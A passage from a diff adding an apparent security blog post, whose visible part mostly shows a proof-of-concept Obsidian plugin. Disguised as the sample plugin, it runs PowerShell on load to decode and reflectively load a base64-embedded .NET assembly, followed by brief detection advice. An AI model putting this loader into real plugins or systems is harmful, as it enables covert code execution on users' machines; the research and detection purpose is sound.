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HMAaQBvAG4AAAAxAC4AMAAuADAALgAwAAAAOAAIAAEAQQBzAHMAZQBtAGIAbAB5ACAAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAADAAAAKg8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==&#34;</span>;
+        
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">command</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;powershell.exe -c dir;$string=&#34;</span><span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;\&#39;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">string2</span> <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;\&#39;&#34;</span> <span style="color:#f92672">+</span><span style="color:#e6db74">&#34;;$bytes=[System.Convert]::FromBase64String($string);[System.Reflection.Assembly]::Load($bytes);[TestAssembly.Program]::Main(&#39;foo&#39;)&#34;</span>;
+        <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">exec</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;child_process&#34;</span>);
+        <span style="color:#a6e22e">exec</span>(<span style="color:#a6e22e">command</span>, (<span style="color:#a6e22e">error</span>, <span style="color:#a6e22e">stdout</span>, <span style="color:#a6e22e">stderr</span>) =&gt; {
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">error</span>) {
+                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`error: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">error</span>.<span style="color:#a6e22e">message</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+                <span style="color:#66d9ef">return</span>;
+            }
+            <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">stderr</span>) {
+                <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`stderr: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">stderr</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+                <span style="color:#66d9ef">return</span>;
+            }
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`stdout: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">stdout</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+        });
+        
+        
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addStatusBarItem</span>().<span style="color:#a6e22e">setText</span>(<span style="color:#e6db74">&#39;Status Bar Text&#39;</span>);
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addCommand</span>({
+            <span style="color:#a6e22e">id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;open-sample-modal&#39;</span>,
+            <span style="color:#a6e22e">name</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Open Sample Modal&#39;</span>,
+            <span style="color:#75715e">// callback: () =&gt; {
+</span><span style="color:#75715e"></span>            <span style="color:#75715e">// 	console.log(&#39;Simple Callback&#39;);
+</span><span style="color:#75715e"></span>            <span style="color:#75715e">// },
+</span><span style="color:#75715e"></span>            <span style="color:#a6e22e">checkCallback</span><span style="color:#f92672">:</span> <span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">checking</span>) {
+                <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">leaf</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">_this</span>.<span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">workspace</span>.<span style="color:#a6e22e">activeLeaf</span>;
+                <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">leaf</span>) {
+                    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">checking</span>) {
+                        <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SampleModal</span>(<span style="color:#a6e22e">_this</span>.<span style="color:#a6e22e">app</span>).<span style="color:#a6e22e">open</span>();
+                    }
+                    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+                }
+                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+            }
+        });
+        <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">addSettingTab</span>(<span style="color:#66d9ef">new</span> <span style="color:#a6e22e">SampleSettingTab</span>(<span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">app</span>, <span style="color:#66d9ef">this</span>));
+    };
+    <span style="color:#a6e22e">MyPlugin</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">onunload</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;unloading plugin&#39;</span>);
+    };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">MyPlugin</span>;
+}(<span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Plugin</span>));
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">SampleModal</span> <span style="color:#f92672">=</span> <span style="color:#75715e">/** @class */</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_super</span>) {
+    <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">SampleModal</span>, <span style="color:#a6e22e">_super</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">SampleModal</span>(<span style="color:#a6e22e">app</span>) {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_super</span>.<span style="color:#a6e22e">call</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">app</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>;
+    }
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SampleModal</span>;
+}(<span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Modal</span>));
+<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">SampleSettingTab</span> <span style="color:#f92672">=</span> <span style="color:#75715e">/** @class */</span> (<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">_super</span>) {
+    <span style="color:#a6e22e">__extends</span>(<span style="color:#a6e22e">SampleSettingTab</span>, <span style="color:#a6e22e">_super</span>);
+    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">SampleSettingTab</span>() {
+        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">_super</span> <span style="color:#f92672">!==</span> <span style="color:#66d9ef">null</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">_super</span>.<span style="color:#a6e22e">apply</span>(<span style="color:#66d9ef">this</span>, <span style="color:#a6e22e">arguments</span>) <span style="color:#f92672">||</span> <span style="color:#66d9ef">this</span>;
+    }
+    <span style="color:#a6e22e">SampleSettingTab</span>.<span style="color:#a6e22e">prototype</span>.<span style="color:#a6e22e">display</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">function</span> () {
+        <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">containerEl</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">this</span>.<span style="color:#a6e22e">containerEl</span>;
+        <span style="color:#a6e22e">containerEl</span>.<span style="color:#a6e22e">empty</span>();
+        <span style="color:#a6e22e">containerEl</span>.<span style="color:#a6e22e">createEl</span>(<span style="color:#e6db74">&#39;h2&#39;</span>, { <span style="color:#a6e22e">text</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Settings for my awesome plugin.&#39;</span> });
+        <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">Setting</span>(<span style="color:#a6e22e">containerEl</span>)
+            .<span style="color:#a6e22e">setName</span>(<span style="color:#e6db74">&#39;Setting #1&#39;</span>)
+            .<span style="color:#a6e22e">setDesc</span>(<span style="color:#e6db74">&#39;It\&#39;s a secret&#39;</span>)
+            .<span style="color:#a6e22e">addText</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">text</span>) { <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">text</span>.<span style="color:#a6e22e">setPlaceholder</span>(<span style="color:#e6db74">&#39;Enter your secret&#39;</span>)
+            .<span style="color:#a6e22e">setValue</span>(<span style="color:#e6db74">&#39;&#39;</span>)
+            .<span style="color:#a6e22e">onChange</span>(<span style="color:#66d9ef">function</span> (<span style="color:#a6e22e">value</span>) {
+            <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;Secret: &#39;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">value</span>);
+        }); });
+    };
+    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">SampleSettingTab</span>;
+}(<span style="color:#a6e22e">obsidian</span>.<span style="color:#a6e22e">PluginSettingTab</span>));
+
+<span style="color:#a6e22e">module</span>.<span style="color:#a6e22e">exports</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">MyPlugin</span>;
+
+</code></pre></div><p><img src="/images/obsidiancodeexec.png" alt="codeexec"></p>
+<h1 id="conclusion">Conclusion<a href="#conclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Don&rsquo;t install unknown plugins for markdown editors. Or use pen and paper.</p>
+<h1 id="detection">Detection<a href="#detection" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Since all this pluign is doing is executing system commands the normal detection capabilities shoud be applied. In this instance monitor for suspicious or malicious powershell commands such as<code>[System.Reflection.Assembly]::Load($bytes)</code>which is a common reflective loading technique. Alternative solutions do exist such as <code>[System.Reflection.Assembly]::LoadFrom('c:\tmp\malicousFile.dll')</code>.</p>
+<p>Additionally, monitor for any child processes of obsidian</p>
+<p><img src="/images/obsidiandetection.png" alt="detection"></p>
+
+      </div></div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="https://thomas-byrne.co.uk/assets/main.js"></script>
+<script src="https://thomas-byrne.co.uk/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
